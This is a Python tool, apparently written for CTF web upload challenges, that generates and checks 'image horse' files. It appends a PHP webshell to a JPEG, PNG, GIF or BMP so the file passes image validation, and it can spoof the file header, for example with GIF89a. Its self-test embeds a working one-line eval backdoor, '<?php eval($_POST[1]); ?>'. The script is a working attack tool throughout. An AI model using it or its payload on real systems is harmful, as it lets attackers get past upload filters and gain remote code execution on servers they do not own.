# -*- coding: utf-8 -*-
"""imgshell 图片马生成/校验

用途: Web 文件上传题——把 webshell 拼接在图片尾部绕过图片检测(getimagesize 通过)。

用法:
    python imgshell.py --selftest                            # 自测
    python imgshell.py --make shell.jpg -p shell.php -o out.jpg   # 生成图片马
    python imgshell.py --check out.jpg                       # 校验头完整+payload位置
    可选 --pre "GIF89a" 覆盖文件头(用于绕过内容检测的场景)。
"""
import argparse
import sys

MAGICS = {
    'jpg': b'\xff\xd8\xff',
    'png': b'\x89PNG',
    'gif': b'GIF89a',
    'bmp': b'BM',
}


def make(image_path, payload_path, out_path, pre_magic=None):
    with open(image_path, 'rb') as f:
        img = f.read()
    with open(payload_path, 'rb') as f:
        payload = f.read()
    if pre_magic:
        head = pre_magic.encode('latin-1') if isinstance(pre_magic, str) else pre_magic
        img = head + img[len(head):] if img.startswith(head) else head + img
    data = img + payload
    with open(out_path, 'wb') as f:
        f.write(data)
    return len(img), len(payload)


def check(path):
    with open(path, 'rb') as f:
        data = f.read()
    kind = None
    for name, magic in MAGICS.items():
        if data.startswith(magic):
            kind = name
            break
    print('图片头:', kind if kind else '未知(可能被 --pre 覆盖)')
    for name in ('<?php', '<%=', 'GIF89a'):
        if name.encode() in data[4:]:
            off = data.find(name.encode())
            print(f'发现 payload 标记 {name!r} @ offset {off}')
            break
    else:
        print('未发现常见 webshell 标记(<?php / <%=)')
    return kind


def main():
    ap = argparse.ArgumentParser(description='图片马生成/校验')
    ap.add_argument('--make', metavar='IMAGE', help='载体图片')
    ap.add_argument('-p', '--payload', help='payload 文件(php/webshell)')
    ap.add_argument('-o', '--out', default='shell.jpg', help='输出路径')
    ap.add_argument('--pre', default='', help='覆盖文件头(如 GIF89a)')
    ap.add_argument('--check', metavar='FILE', help='校验图片马')
    ap.add_argument('--selftest', action='store_true')
    args = ap.parse_args()

    if args.selftest:
        import io
        import os
        from PIL import Image
        ok = True
        buf = io.BytesIO()
        Image.new('RGB', (16, 16), (0, 128, 0)).save(buf, 'JPEG')
        with open('_t.jpg', 'wb') as f:
            f.write(buf.getvalue())
        with open('_t.php', 'w') as f:
            f.write('<?php eval($_POST[1]); ?>')
        n_img, n_pay = make('_t.jpg', '_t.php', '_t_out.jpg')
        with open('_t_out.jpg', 'rb') as f:
            data = f.read()
        good = data.startswith(b'\xff\xd8\xff') and len(data) == n_img + n_pay \
            and b'<?php' in data
        ok &= good
        print(f"[{'OK' if good else 'FAIL'}] 图片马: 头部保留+payload 追加 ({len(data)}B)")
        kind = check('_t_out.jpg')
        good2 = kind == 'jpg'
        ok &= good2
        print(f"[{'OK' if good2 else 'FAIL'}] 校验识别: {kind}")
        for p in ('_t.jpg', '_t.php', '_t_out.jpg'):
            os.remove(p)
        sys.exit(0 if ok else 1)

    if args.check:
        check(args.check)
    elif args.make and args.payload:
        n_img, n_pay = make(args.make, args.payload, args.out,
                            pre_magic=args.pre or None)
        print(f'已生成: {args.out} (图片 {n_img}B + payload {n_pay}B)')
    else:
        ap.error('需要 --make+-p+-o 或 --check(或 --selftest)')


if __name__ == '__main__':
    main()
